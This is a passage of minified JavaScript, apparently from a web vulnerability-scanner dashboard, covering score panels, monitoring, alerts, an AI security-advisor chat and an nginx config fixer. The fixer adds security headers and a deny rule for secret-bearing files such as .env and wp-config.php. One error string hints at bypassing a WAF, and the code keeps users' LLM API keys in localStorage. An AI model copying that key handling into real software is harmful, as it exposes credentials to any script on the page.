i=document.getElementById("evolution-content");if(!i)return;let t=Math.round(e.evolution_score||0),s=e.learning||{},r=e.monitoring||{},o=e.team||{},a=s.trend||[],n=s.persistent_issues||[],d=s.recommendations||[],f=s.predicted_next_score,v=t>=80?"#73c990":t>=50?"#f0a732":"#c75450",c="";c+='<div class="evo-score-card">',c+='  <div class="evo-score-label">进化指数</div>',c+='  <div class="evo-score-value" style="color:'+v+'">'+t+"</div>",c+='  <div class="evo-score-bar"><div class="evo-score-fill" style="width:'+t+"%;background:"+v+'"></div></div>',c+='  <div class="evo-score-hint">基于历史扫描、监控告警与团队协作综合计算</div>',c+="</div>",c+='<div class="evo-grid">',c+=Mt("智能学习","","#4b6eaf",[{k:"总扫描次数",v:s.total_scans||0},{k:"平均分",v:s.avg_score||"-"},{k:"最高分",v:s.best_score||"-"},{k:"预测下次",v:f||"-"}],()=>Pt("learning")),c+=Mt("主动监控","","#c75450",[{k:"监控项",v:r.monitors_count||0},{k:"未读告警",v:r.unread_alerts||0},{k:"状态",v:r.monitors_count?"运行中":"未启用"}],()=>Pt("monitoring")),c+=Mt("安全顾问","","#4b6eaf",[{k:"会话记忆",v:"已启用"},{k:"建议数",v:d.length},{k:"响应",v:"实时"}],()=>Pt("ai")),c+=Mt("团队协作","","#73c990",[{k:"加入团队",v:o.teams_count||0},{k:"评论",v:"可发起"},{k:"状态",v:o.teams_count?"已加入":"未加入"}],()=>Pt("team")),c+="</div>",c+='<div class="evo-row">',c+='  <div class="evo-panel">',c+='    <div class="evo-panel-title">评分趋势</div>',a.length===0?c+='    <div class="evo-empty">暂无历史评分，先做一次扫描</div>':(c+='    <div class="evo-trend">',a.forEach(function(p){c+='<div class="evo-trend-item"><div class="evo-trend-score">'+p.score+'</div><div class="evo-trend-date">'+fe(p.date||"")+"</div></div>"}),c+="    </div>"),c+="  </div>",c+='  <div class="evo-panel">',c+='    <div class="evo-panel-title">持续问题</div>',n.length===0?c+='    <div class="evo-empty">暂无持续性问题</div>':(c+='    <ul class="evo-list">',n.forEach(function(p){if(typeof p=="string")c+="<li>"+fe(p)+"</li>";else if(p&&typeof p=="object"){let h=p.name||p.title||p.issue||JSON.stringify(p),m=p.times?' <span class="evo-empty">×'+p.times+"</span>":"",g=p.severity?' <span class="evo-alert-time">['+fe(p.severity)+"]</span>":"";c+="<li>"+fe(h)+m+g+"</li>"}else c+="<li>"+fe(String(p))+"</li>"}),c+="    </ul>"),c+="  </div>",c+="</div>",c+='<div class="evo-panel">',c+='  <div class="evo-panel-title">个性化建议</div>',d.length===0?c+='  <div class="evo-empty">完成更多扫描后，系统会给出更精准的建议</div>':(c+='  <ul class="evo-recs">',d.forEach(function(p){c+="<li>"+fe(p)+"</li>"}),c+="  </ul>"),c+="</div>",r.alerts&&r.alerts.length>0&&(c+='<div class="evo-panel">',c+='  <div class="evo-panel-title">最新告警</div>',c+='  <ul class="evo-alerts">',r.alerts.slice(0,5).forEach(function(p){c+='<li><span class="evo-alert-time">'+fe(p.created_at||"")+"</span> - "+fe(p.message||"")+"</li>"}),c+="  </ul>",c+="</div>"),i.innerHTML=c}function Mt(e,i,t,s,r){let o='<div class="evo-card" style="border-top:2px solid '+t+'" onclick="('+r.toString()+')()">';return o+='  <div class="evo-card-head"><span class="evo-card-icon" style="background:#313335;color:'+t+'">'+i+'</span><span class="evo-card-title">'+e+"</span></div>",o+='  <div class="evo-card-items">',s.forEach(function(a){o+='<div class="evo-card-item"><div class="evo-card-k">'+fe(a.k)+'</div><div class="evo-card-v">'+fe(String(a.v))+"</div></div>"}),o+="  </div>",o+="</div>",o}function Pt(e){let i="";e==="monitoring"?(i='<div class="evo-detail">',i+='  <div class="evo-detail-title">添加监控</div>',i+='  <div class="evo-detail-form">',i+='    <input id="mon-url" class="evo-input" placeholder="https://示例.com" />',i+='    <input id="mon-freq" class="evo-input" type="number" min="60" value="3600" placeholder="检查频率（秒）" />',i+='    <button class="evo-btn" onclick="createMonitor()">创建监控</button>',i+="  </div>",i+='  <div id="evo-mon-list"></div>',i+="</div>",ie("提示:在弹窗中可创建监控","info")):e==="ai"?(i='<div class="ai-chat-wrap">',i+='  <div class="ai-status-bar" id="ai-status-bar"><span class="ai-status-dot pending"></span><span class="ai-status-text">检测中...</span></div>',i+='  <div class="ai-quick">',i+=`    <button class="ai-quick-btn" onclick="aiSend('我的网站最近有什么风险?')">我的风险</button>`,i+=`    <button class="ai-quick-btn" onclick="aiSend('怎么修 HSTS 缺失?')">修 HSTS</button>`,i+=`    <button class="ai-quick-btn" onclick="aiSend('我应该先修哪个问题?')">优先级</button>`,i+=`    <button class="ai-quick-btn" onclick="aiSend('解释一下 CSP 是什么')">CSP 解释</button>`,i+="  </div>",i+='  <div id="evo-ai-msgs" class="ai-msgs">',i+='    <div class="ai-msg bot">',i+='      <div class="ai-msg-avatar">顾问</div>',i+='      <div class="ai-msg-body">',i+='        <div class="ai-msg-name">安全顾问</div>',i+='        <div class="ai-msg-content">你好！我是Vuln Sentinel的安全顾问。<br><br>我可以帮你：<br>• 分析扫描报告与漏洞优先级<br>• 给出可执行的安全修复步骤<br>• 解释安全概念与配置示例<br>• 基于你的历史给出个性化建议<br><br>试试上方的快捷问题，或直接输入想了解的安全问题。</div>',i+="      </div>",i+="    </div>",i+="  </div>",i+='  <div class="ai-input-bar">',i+='    <textarea id="evo-ai-q" class="ai-input" rows="1" placeholder="想问什么…（Shift+Enter 换行）"></textarea>',i+='    <button class="ai-send-btn" id="ai-send-btn" onclick="aiAsk()">发送</button>',i+="  </div>",i+="</div>",setTimeout(function(){ya();let r=document.getElementById("evo-ai-q");r&&(r.addEventListener("keydown",function(o){o.key==="Enter"&&!o.shiftKey&&(o.preventDefault(),Zn())}),r.addEventListener("input",function(){this.style.height="auto",this.style.height=Math.min(this.scrollHeight,120)+"px"}))},100)):e==="team"?(i='<div class="evo-detail">',i+='  <div class="evo-detail-title">团队协作</div>',i+='  <div class="evo-detail-form">',i+='    <input id="team-name" class="evo-input" placeholder="团队名称" />',i+='    <button class="evo-btn" onclick="createTeam()">创建团队</button>',i+="  </div>",i+='  <div id="evo-team-list"></div>',i+="</div>"):e==="learning"&&(i='<div class="evo-detail">',i+='  <div class="evo-detail-title">智能学习洞察</div>',i+='  <div class="evo-empty">系统会基于您的历史扫描自动归纳模式、预测风险与生成建议</div>',i+="</div>");let t=document.getElementById("evolution-content"),s=document.createElement("div");s.className="evo-modal-bg",s.innerHTML='<div class="evo-modal"><div class="evo-modal-close" onclick="this.parentNode.parentNode.remove()">&times;</div>'+i+"</div>",t.appendChild(s)}function ma(){let e=document.getElementById("mon-url").value.trim(),i=parseInt(document.getElementById("mon-freq").value)||3600;if(!e){ie("请输入 URL","error");return}ke("/api/monitors",{method:"POST",body:JSON.stringify({url:e,frequency:i})}).then(function(t){return t.json()}).then(function(t){t.id||t.monitor_id?(ie("监控已创建","success"),Qt()):ie("创建失败","error")}).catch(function(t){ie("创建失败: "+t.message,"error")})}function Zn(){let e=document.getElementById("evo-ai-q");if(!e)return;let i=e.value.trim();i&&Xn(i)}let oi=!1;function Xn(e){if(oi)return;let i=document.getElementById("evo-ai-q"),t=document.getElementById("evo-ai-msgs"),s=document.getElementById("ai-send-btn");if(!t)return;oi=!0,t.innerHTML+='<div class="ai-msg user">  <div class="ai-msg-avatar user">我</div>  <div class="ai-msg-body">    <div class="ai-msg-content">'+fe(e)+"</div>  </div></div>",i&&(i.value=""),s&&(s.disabled=!0,s.textContent="思考中…");let r="typing-"+Date.now();t.innerHTML+='<div class="ai-msg bot" id="'+r+'">  <div class="ai-msg-avatar">顾问</div>  <div class="ai-msg-body"><div class="ai-msg-content"><span class="ai-typing">...</span></div></div></div>',t.scrollTop=t.scrollHeight,ke("/api/ai/chat",{method:"POST",body:JSON.stringify({message:e})}).then(function(o){return o.json()}).then(function(o){let a=document.getElementById(r);a&&a.remove();let n=o&&o.response||o&&o.reply||o&&o.message||JSON.stringify(o),d="";if(o&&o.llm_used){let f=(o.llm_provider||"LLM").toUpperCase();d='<span class="ai-tag real">真 '+fe(f)+"</span>"}else d='<span class="ai-tag local">本地规则</span>';t.innerHTML+='<div class="ai-msg bot">  <div class="ai-msg-avatar">顾问</div>  <div class="ai-msg-body">    <div class="ai-msg-name">安全顾问 '+d+'</div>    <div class="ai-msg-content">'+ba(n)+"</div>  </div></div>",t.scrollTop=t.scrollHeight}).catch(function(o){let a=document.getElementById(r);a&&a.remove(),t.innerHTML+='<div class="ai-msg bot">  <div class="ai-msg-avatar">顾问</div>  <div class="ai-msg-body"><div class="ai-msg-content">请求失败: '+fe(o.message)+"</div></div></div>"}).finally(function(){oi=!1,s&&(s.disabled=!1,s.textContent="发送")})}function ya(){let e=document.getElementById("ai-status-bar");e&&fetch("/api/ai/status").then(function(i){return i.json()}).then(function(i){!i||!i.success||(i.llm_enabled&&i.api_key_configured?e.innerHTML='<span class="ai-status-dot ok"></span><span class="ai-status-text">已连接真实 LLM · '+fe(i.provider)+" / "+fe(i.model)+"</span>":e.innerHTML='<span class="ai-status-dot local"></span><span class="ai-status-text">本地规则模式（未配置 LLM Key）</span>')}).catch(function(){e.innerHTML='<span class="ai-status-dot err"></span><span class="ai-status-text">无法获取安全顾问状态</span>'})}function ba(e){if(!e)return"";let i=String(e).split(/```/),t=[];for(let s=0;s<i.length;s++)if(s%2===1)t.push('<pre class="ai-code"><code>'+fe(i[s])+"</code></pre>");else{let r=fe(i[s]);r=r.replace(/`([^`\n]+)`/g,'<code class="ai-code-inline">$1</code>'),r=r.replace(/\*\*([^*]+)\*\*/g,"<strong>$1</strong>"),r.split(/\n\n+/).forEach(function(a){let n=a.replace(/\n/g," ").trim();n&&t.push("<p>"+n+"</p>")})}return t.join("")}function xa(){let e=document.getElementById("team-name").value.trim();if(!e){ie("请输入团队名","error");return}ke("/api/teams",{method:"POST",body:JSON.stringify({name:e})}).then(function(i){return i.json()}).then(function(i){i.id||i.team_id?(ie("团队已创建","success"),Qt()):ie("创建失败: "+JSON.stringify(i),"error")}).catch(function(i){ie("创建失败: "+i.message,"error")})}function wa(e){let i=Je.find(function(o){return o.id===e});if(!i)return;let t=prompt("修改域名:",i.domain||"");if(t===null)return;let s=prompt("修改负责人:",i.owner||"");if(s===null)return;let r=prompt("修改描述:",i.description||"");r!==null&&ke("/api/assets/"+e,{method:"PATCH",body:JSON.stringify({domain:t.trim(),owner:s.trim(),description:r.trim()})}).then(function(o){return o.json()}).then(function(o){o.id||o.success?(ie("资产更新成功","success"),Ti()):ie(rt(o)||"更新失败","error")}).catch(function(o){ie("更新失败: "+o.message,"error")})}function ka(e){confirm("确定要删除此资产吗？")&&ke("/api/assets/"+e,{method:"DELETE"}).then(function(i){if(i.ok||i.status===204)ie("资产已删除","success"),Ti();else return i.json().then(function(t){throw new Error(rt(t)||"删除失败")})}).catch(function(i){ie("删除失败: "+i.message,"error")})}function _a(e,i){if(!i)return;let t=i;/^https?:\/\//i.test(t)||(t="https://"+t),document.getElementById("scan-url").value=t,zt("scan"),typeof window.startScanDirect=="function"&&window.startScanDirect()}function Sa(){let e=document.getElementById("ai-chat");e&&(document.getElementById("ai-fab-badge"),e.classList.contains("show")?(e.classList.remove("show"),e.style.display=""):(e.classList.add("show"),e.style.display="",Ca(),setTimeout(function(){let i=document.getElementById("ai-input");i&&i.focus()},300)))}function Ge(e,i){let t=document.getElementById("ai-chat-body");if(!t)return null;let s=document.createElement("div");s.className="ai-msg "+(i||"bot");let r=Ea(e||"");s.innerHTML=r;let o=s.querySelectorAll("pre");for(let a=0;a<o.length;a++)(function(n){let d=document.createElement("div");d.className="ai-code-block";let f=document.createElement("button");f.className="ai-code-copy",f.textContent="复制",f.onclick=function(){let v=n.textContent;if(navigator.clipboard)navigator.clipboard.writeText(v).then(function(){f.textContent="已复制",setTimeout(function(){f.textContent="复制"},1500)});else{let c=document.createElement("textarea");c.value=v,document.body.appendChild(c),c.select(),document.execCommand("copy"),document.body.removeChild(c),f.textContent="已复制",setTimeout(function(){f.textContent="复制"},1500)}},n.parentNode.insertBefore(d,n),d.appendChild(f),d.appendChild(n)})(o[a]);return t.appendChild(s),t.scrollTop=t.scrollHeight,i==="bot"&&(document.getElementById("ai-chat").classList.contains("show")||za()),s}function Ea(e){if(!e)return"";let i=e.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;"),t=[];return i=i.replace(/```([\s\S]*?)```/g,function(s,r){let o=r.replace(/^\n+|\n+$/g,"").split(`
`),a="";o.length>0&&/^(nginx|apache|javascript|python|bash|sql|html|css|json|java|php|ruby|go|rust)$/i.test(o[0].trim())&&(a=o[0].trim(),o=o.slice(1));let n=o.join(`
`),d=t.length;return t.push({code:n,lang:a}),"__CODE_BLOCK_"+d+"__"}),i=i.replace(/`([^`\n]+)`/g,'<code class="ai-inline-code">$1</code>'),i=i.replace(/\*\*([^*]+)\*\*/g,"<strong>$1</strong>"),i=i.replace(/^---\s*$/gm,'<hr class="ai-divider">'),i=i.replace(/(^|\n)((?:\s*[-*]\s+[^\n]+\n?)+)/g,function(s,r,o){let n=o.trim().split(`
`).filter(function(d){return d.trim()}).map(function(d){return"<li>"+d.replace(/^\s*[-*]\s+/,"")+"</li>"}).join("");return r+'<ul class="ai-list">'+n+"</ul>"}),i=i.replace(/(^|\n)((?:\s*\d+\.\s+[^\n]+\n?)+)/g,function(s,r,o){let n=o.trim().split(`
`).filter(function(d){return d.trim()}).map(function(d){return"<li>"+d.replace(/^\s*\d+\.\s+/,"")+"</li>"}).join("");return r+'<ol class="ai-list ol">'+n+"</ol>"}),i=i.replace(/__CODE_BLOCK_(\d+)__/g,function(s,r){let o=t[parseInt(r)];return'<div class="ai-code-wrap">'+(o.lang?'<span class="ai-code-lang">'+o.lang+"</span>":"")+"<pre><code>"+o.code+"</code></pre></div>"}),i=i.replace(/\n/g,"<br>"),i}let Dt=0;function za(){Dt++;let e=document.getElementById("ai-fab-badge");e&&(e.textContent=Dt>99?"99+":String(Dt),e.style.display="")}function Ca(){Dt=0;let e=document.getElementById("ai-fab-badge");e&&(e.style.display="none",e.textContent="0")}function Ta(){let e=document.getElementById("ai-chat-body");if(!e)return null;let i=document.createElement("div");return i.className="ai-msg bot ai-typing-wrap",i.innerHTML='<span class="ai-typing"><span></span><span></span><span></span></span>',e.appendChild(i),e.scrollTop=e.scrollHeight,i}let Ft=!1;async function Vn(){if(Ft)return;let e=document.getElementById("ai-input"),i=(e.value||"").trim();if(!i)return;if(Ft=!0,Ge(i,"user"),e.value="",!Le()){Ge("请先登录后再使用安全顾问。登录后我还能根据你的扫描历史给出个性化建议。","bot"),Ft=!1;return}let t=Ta();try{let s=Jn(),r={message:i};s.api_key&&(r.api_key=s.api_key,r.provider=s.provider,r.model=s.model,r.use_llm=s.use_llm!==!1);let o=await ke("/api/ai-advisor",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(r)}),a=await o.json();t&&t.parentNode&&t.remove(),o.ok?Ge(a.reply||"（无回复）","bot"):o.status===429?Ge("你问得太快啦，让我歇一会儿～ 1 分钟后再试试吧！","bot"):o.status===401||o.status===403?Ge("登录状态好像过期了，刷新一下页面重新登录试试？","bot"):Ge(`抱歉，我刚才处理出现了问题。你再说一遍刚才的问题好吗？

（错误：`+fe(rt(a))+"）","bot")}catch{t&&t.parentNode&&t.remove(),Ge(`网络连接出现问题，检查一下网络连接再试试？

如果问题一直出现，可以刷新页面试试。`,"bot")}finally{Ft=!1}}function Ia(e){let i=document.getElementById("ai-input");i&&(i.value=e),Vn()}function Gn(e){let i=e&&(e.message||e.error||e.detail)||String(e)||"未知错误";return/timeout|timed out/i.test(i)?"网络连接超时，请检查 URL 是否可访问":/dns|getaddrinfo|Name or service not known/i.test(i)?"域名解析失败，请检查域名是否正确":/403|forbidden/i.test(i)?"目标站点拒绝访问，可能需要授权或绕过 WAF":/404|not found/i.test(i)?"目标页面不存在，请检查 URL 路径":/ssl|certificate|handshake/i.test(i)?"SSL/TLS 握手失败，证书可能无效或过期":/refused|connect/i.test(i)?"连接被拒绝，目标站点可能不可达":/authorized|授权/i.test(i)?"请先勾选「我已获得授权扫描此目标」":/rate|limit|频率/i.test(i)?"扫描频率超限，请稍后再试":i.length>60?i.substring(0,60)+"...":i}window.friendlyError=Gn;Dn(function(){et();try{Vt()}catch(e){console.warn("loadAuthChallenge error:",e)}setInterval(et,6e4);try{}catch(e){console.warn("initScanPage error:",e)}});function Aa(){try{let e=`server {
    listen 80;
    server_name example.com www.example.com;
    root /var/www/html;
    index index.html index.php;

    location / {
        try_files $uri $uri/ =404;
    }

    location ~ \\.php$ {
        fastcgi_pass unix:/run/php/php-fpm.sock;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;
    }

    access_log /var/log/nginx/access.log;
    error_log /var/log/nginx/error.log;
}`,i=document.getElementById("fixer-input");i&&(i.value=e),ie("已载入示例服务器配置")}catch(e){console.error("loadSampleConfig error:",e),ie("加载示例配置失败: "+(e.message||String(e)),"error")}}function Ba(){try{if(!confirm("确定要清空当前配置内容吗？"))return;let e=document.getElementById("fixer-input"),i=document.getElementById("fixer-result");e&&(e.value=""),i&&(i.innerHTML=""),ie("已清空")}catch(e){console.error("clearFixer error:",e),ie("清空失败: "+(e.message||String(e)),"error")}}function La(){qi("fixer-analyze-btn",!0),setTimeout(function(){qi("fixer-analyze-btn",!1)},600);let e=document.getElementById("fixer-input");if(!e)return;let i=e.value.trim();if(!i){ie("请先输入或粘贴服务器配置");return}try{let t=Oa(i);ui=t,Ma(t,i)}catch(t){console.error("analyzeFixer error:",t);let s=document.getElementById("fixer-result");s&&(s.innerHTML='<div class="card"><p style="color:var(--danger)">分析失败: '+fe(t.message||String(t))+"</p></div>")}}function Oa(e){let i=[];e.split(`
`),/Strict-Transport-Security/i.test(e)||i.push({name:"HSTS 未配置",severity:"high",reason:"未设置 Strict-Transport-Security 头，浏览器不会强制使用 HTTPS，可能导致降级攻击。",fix:'add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;'}),/Content-Security-Policy/i.test(e)||i.push({name:"CSP 未配置",severity:"high",reason:"未设置 Content-Security-Policy 头，网站容易受到 XSS 攻击和数据注入。",fix:`add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'" always;`}),/X-Frame-Options/i.test(e)||i.push({name:"X-Frame-Options 未配置",severity:"medium",reason:"未设置 X-Frame-Options 头，网站可能被嵌入到恶意页面的 iframe 中进行点击劫持攻击。",fix:'add_header X-Frame-Options "DENY" always;'}),/X-Content-Type-Options/i.test(e)||i.push({name:"X-Content-Type-Options 未配置",severity:"medium",reason:"未设置 X-Content-Type-Options 头，浏览器可能进行 MIME 类型嗅探，导致安全问题。",fix:'add_header X-Content-Type-Options "nosniff" always;'}),/Referrer-Policy/i.test(e)||i.push({name:"Referrer-Policy 未配置",severity:"low",reason:"未设置 Referrer-Policy 头，可能泄露敏感 URL 信息给第三方网站。",fix:'add_header Referrer-Policy "strict-origin-when-cross-origin" always;'}),/Permissions-Policy/i.test(e)||i.push({name:"Permissions-Policy 未配置",severity:"low",reason:"未设置 Permissions-Policy 头，浏览器可能允许不必要的权限访问（摄像头、麦克风等）。",fix:'add_header Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=()" always;'});let t=/listen\s+443/i.test(e),s=/return\s+301\s+https/i.test(e)||/rewrite.*https/i.test(e);!t&&!s&&/listen\s+80/i.test(e)&&i.push({name:"HTTP 到 HTTPS 跳转未配置",severity:"high",reason:"仅监听 HTTP 80 端口且未配置 HTTPS 跳转，所有通信为明文传输。",fix:`server {
    listen 80;
    server_name _;
    return 301 https://$host$request_uri;
}`}),/\.env|deny\s+all|location.*\.(env|git|sql|zip|bak)/i.test(e)||i.push({name:"敏感文件拦截未配置",severity:"high",reason:"未配置敏感文件访问拦截规则，.env、.git、.sql 等文件可能被直接访问。",fix:`location ~ /(.env|.git|.gitignore|.*.sql|.*.zip|.*.tar.gz|.*.bak|.*.log|wp-config.php) {
    deny all;
    return 403;
}`});let r=e,o=[],a=[];if(i.forEach(function(d){d.name==="敏感文件拦截未配置"?a.push(d.fix):d.name!=="HTTP 到 HTTPS 跳转未配置"&&o.push(d.fix)}),o.length>0||a.length>0){let d=r.lastIndexOf("}");if(d>0){let f=r.substring(0,d),v=r.substring(d);o.length>0&&o.forEach(function(c){f+="    "+c+`
`}),a.length>0&&a.forEach(function(c){c.split(`
`).forEach(function(h){h.trim()&&(f+="    "+h.trim()+`
`)})}),r=f+v}}let n=Ra(e,r);return{issues:i,fixed:r,diff:n}}function Ra(e,i){let t=e.split(`
`),s=i.split(`
`),r=[],o=!1;for(let a=0;a<s.length;a++)a<t.length?t[a]!==s[a]?(o||(r.push({type:"context",text:"..."}),o=!0),r.push({type:"add",text:"+ "+s[a]})):(o&&a>0&&(r.push({type:"context",text:"..."}),o=!1),r.push({type:"context",text:"  "+s[a]})):r.push({type:"add",text:"+ "+s[a]});return r}function Ma(e,i){try{e=e||{issues:[],fixed:"",diff:[]},e.issues=e.issues||[],e.diff=e.diff||[];let t="",s=0,r=0,o=0;e.issues.forEach(function(n){n.severity==="high"?s++:n.severity==="medium"?r++:o++}),t+='<div class="card fade-in-up">',t+='<div class="card-title">检测结果</div>',t+='<div class="risk-stats" style="margin-bottom:0">',t+='<div class="risk-stat high"><div class="num">'+s+'</div><div class="label">高严重</div></div>',t+='<div class="risk-stat medium"><div class="num">'+r+'</div><div class="label">中严重</div></div>',t+='<div class="risk-stat low"><div class="num">'+o+'</div><div class="label">低严重</div></div>',t+="</div></div>",t+='<div class="card fade-in-up" style="animation-delay:0.1s">',t+='<div class="card-title">修复点清单</div>',e.issues.forEach(function(n){t+='<div class="issue-item">',t+='<span class="issue-severity '+n.severity+'">'+(n.severity==="high"?"高":n.severity==="medium"?"中":"低")+"</span>",t+="<div>",t+="<strong>"+fe(n.name)+"</strong>",t+='<p class="issue-reason">'+fe(n.reason)+"</p>",t+="</div></div>"}),t+="</div>",t+='<div class="card fade-in-up" style="animation-delay:0.2s">',t+='<div class="card-title">修复前后对比</div>',t+='<div class="compare-grid">',t+='<div class="compare-col"><h4><span class="dot red"></span>修复前</h4>',t+='<textarea class="compare-textarea" readonly>'+fe(i)+"</textarea></div>",t+='<div class="compare-col"><h4><span class="dot green"></span>修复后 <button class="copy-btn-sm" onclick="copyFixedConfig(this)" data-state="idle" aria-label="复制修复后配置">复制</button></h4>',t+='<textarea class="compare-textarea fixed-textarea" readonly>'+fe(e.fixed)+"</textarea></div>",t+="</div></div>",t+='<div class="card fade-in-up" style="animation-delay:0.3s">',t+='<div class="card-title">Diff 展示</div>',t+='<div class="diff-container">',e.diff.forEach(function(n){t+='<div class="diff-line '+n.type+'">'+fe(n.text)+"</div>"}),t+="</div></div>",t+='<div class="card fade-in-up" style="animation-delay:0.4s">',t+='<div class="card-title">操作</div>',t+='<div class="fixer-btns">',t+='<button class="fixer-btn success" onclick="copyFixerResult()">复制修复后配置</button>',t+='<button class="fixer-btn primary" onclick="downloadNginxConf()">下载服务器配置文件</button>',t+='<button class="fixer-btn success" onclick="downloadRepairReport()">下载修复报告包</button>',t+="</div></div>";let a=document.getElementById("fixer-result");a&&(a.innerHTML=t)}catch(t){console.error("renderFixerResult error:",t);let s=document.getElementById("fixer-result");s&&(s.innerHTML='<div class="card"><p style="color:var(--danger)">渲染失败: '+fe(t.message||String(t))+"</p></div>")}}function Pa(){let e=document.querySelector("#fixer-result .compare-col:last-child textarea");if(!e)return;let i=e.value,t=new Blob([i],{type:"text/plain;charset=utf-8"}),s=URL.createObjectURL(t),r=document.createElement("a");r.href=s,r.download="Nginx 配置文件",document.body.appendChild(r),r.click(),document.body.removeChild(r),URL.revokeObjectURL(s),ie("服务器配置文件已下载")}function Fa(){if(!ui){ie("请先分析配置");return}let e=ui,i=`=== 漏洞哨兵修复报告 ===
`;i+="生成时间："+new Date().toLocaleString("zh-CN")+`

`,i+=`--- 原始风险 ---
`,e.issues.forEach(function(o,a){i+=a+1+". ["+o.severity.toUpperCase()+"] "+o.name+`
`,i+="   原因："+o.reason+`
`}),i+=`
--- 修复项 ---
`,e.issues.forEach(function(o,a){i+=a+1+". "+o.name+`：已修复
`}),i+=`
--- 修复后配置 ---
`,i+=e.fixed+`
`,i+=`
--- 复测建议 ---
`,i+=`1. 使用 curl -I 检查响应头是否包含安全头
`,i+=`2. 访问 /.env 等敏感路径应返回 403
`,i+=`3. 使用 SSL Labs 检测 HTTPS 配置
`,i+=`4. 检查 Content-Security-Policy 是否生效
`;let t=new Blob([i],{type:"text/plain;charset=utf-8"}),s=URL.createObjectURL(t),r=document.createElement("a");r.href=s,r.download="repair-report.txt",document.body.appendChild(r),r.click(),document.body.removeChild(r),URL.revokeObjectURL(s),ie("修复报告已下载")}function ja(e,i){if(i)try{let t=decodeURIComponent(atob(i));Ha(t),ie("已复制到剪贴板")}catch{ie("复制失败")}}function Ha(e){if(navigator.clipboard&&navigator.clipboard.writeText)navigator.clipboard.writeText(e);else{let i=document.createElement("textarea");i.value=e,i.style.position="fixed",i.style.left="-9999px",document.body.appendChild(i),i.select(),document.execCommand("copy"),document.body.removeChild(i)}}function Da(e){document.querySelectorAll(".profile-tab").forEach(function(t){t.style.display="none"});let i=document.getElementById("profile-tab-"+e);i&&(i.style.display="block",i.scrollIntoView({behavior:"smooth",block:"start"})),e==="history"&&renderScanHistory(),e==="monitor"&&renderMonitorTargets(),e==="ai-config"&&Kn(),e==="alerts"&&Ii(),e==="notifications"&&Xa(),e==="credits"&&mi()}function Na(e,i){let t=document.getElementById("setting-"+i);if(!t)return;let s=t.dataset.enabled==="true";t.dataset.enabled=s?"false":"true",t.classList.toggle("on",!s);let r=!s;i==="darkMode"&&(r?(document.documentElement.setAttribute("data-theme","dark"),(function(){try{localStorage.setItem("vs_dark","1")}catch{}})()):(document.documentElement.removeAttribute("data-theme"),(function(){try{localStorage.removeItem("vs_dark")}catch{}})()),updateThemeIcon(r)),i==="auto保存"&&(function(){try{localStorage.setItem("vs_autosave",r?"1":"0")}catch{}})(),i==="notify"&&(function(){try{localStorage.setItem("vs_notify",r?"1":"0")}catch{}})(),ie("设置已更新")}function Jn(){try{let e=localStorage.getItem("vs_ai_config");if(e)return JSON.parse(e)}catch{}return{api_key:"",provider:"openai",model:"",use_llm:!0}}function $a(){let e=document.getElementById("ai-config-apikey").value.trim(),i=document.getElementById("ai-config-provider").value,t=document.getElementById("ai-config-model").value.trim(),s=document.getElementById("setting-useLLM").dataset.enabled==="true",r={api_key:e,provider:i,model:t,use_llm:s};try{localStorage.setItem("vs_ai_config",JSON.stringify(r)),ie("安全顾问配置已保存")}catch(o){ie("保存失败："+(o.message||"浏览器存储受限"),"error")}}function Ua(){try{localStorage.removeItem("vs_ai_config"),document.getElementById("ai-config-apikey").value="",document.getElementById("ai-config-provider").value="openai",document.getElementById("ai-config-model").value="";let e=document.getElementById("setting-useLLM");e&&(e.dataset.enabled="true",e.textContent="已开启",e.style.color="var(--success)"),ie("安全顾问配置已清除")}catch{}}function qa(e){let i=document.getElementById("setting-"+(e==="useLLM"?"useLLM":e));if(!i)return;let t=i.dataset.enabled==="true";i.dataset.enabled=t?"false":"true",i.classList.toggle("on",!t)}function Ii(e){let i=document.getElementById("alerts-list");i&&(i.innerHTML='<div style="text-align:center;padding:20px;color:var(--text-secondary)">正在读取告警...</div>',fetch("/api/alerts?limit=20&unread_only=false",{headers:Qe()}).then(function(t){return t.json()}).then(function(t){let s=t.alerts||[];if(s.length===0){i.innerHTML='<div style="text-align:center;padding:20px;color:var(--text-secondary)">暂无告警记录</div>',document.getElementById("alerts-pagination").style.display="none";return}let r="";s.forEach(function(o){let a=!!o.is_read,n="";o.alert_type==="high_risk_found"||o.alert_type==="monitor_down"?n='<span style="background:var(--danger);color:#fff;font-size:11px;padding:2px 6px;border-radius:2px;margin-left:6px">高危</span>':o.alert_type==="score_drop"?n='<span style="background:var(--warning);color:#fff;font-size:11px;padding:2px 6px;border-radius:2px;margin-left:6px">评分下降</span>':o.alert_type==="scan_complete"&&(n='<span style="background:var(--success);color:#fff;font-size:11px;padding:2px 6px;border-radius:2px;margin-left:6px">完成</span>'),r+='<div class="menu-item" style="margin-bottom:8px;opacity:'+(a?"0.7":"1")+'">',r+='<div style="flex:1">',r+='<div style="font-weight:600;font-size:14px">'+fe(o.title||o.message||"告警")+n+"</div>",r+='<div style="font-size:12px;color:var(--text-secondary);margin-top:4px">'+fe(o.created_at||"")+"</div>",r+='<div style="font-size:13px;color:var(--text);margin-top:4px">'+fe(o.message||"")+"</div>",r+="</div>",a||(r+='<button class="fixer-btn secondary" style="height:32px;padding:0 12px;font-size:12px;margin-left:8px;white-space:nowrap" onclick="markAlertRead('+o.id+', event)">标记已读</button>'),r+="</div>"}),i.innerHTML=r,document.getElementById("alerts-pagination").style.display="none",et()}).catch(function(t){i.innerHTML='<div style="text-align:center;padding:20px;color:var(--text-secondary)">读取失败</div>'}))}function Wa(e,i){i&&i.stopPropagation(),fetch("/api/alerts/"+e+"/read",{method:"POST",headers:Qe()}).then(function(t){return t.json()}).then(function(t){t.success&&(Ii(),et())})}function Za(){fetch("/api/alerts?limit=100",{headers:Qe()}).then(function(e){return e.json()}).then(function(e){let t=(e.alerts||[]).filter(function(r){return!r.is_read});if(t.length===0){ie("没有未读告警");return}let s=0;t.forEach(function(r){fetch("/api/alerts/"+r.id+"/read",{method:"POST",headers:Qe()}).then(function(){s++,s>=t.length&&(Ii(),et(),ie("已全部标记为已读"))})})})}function et(){if(!Le()){let 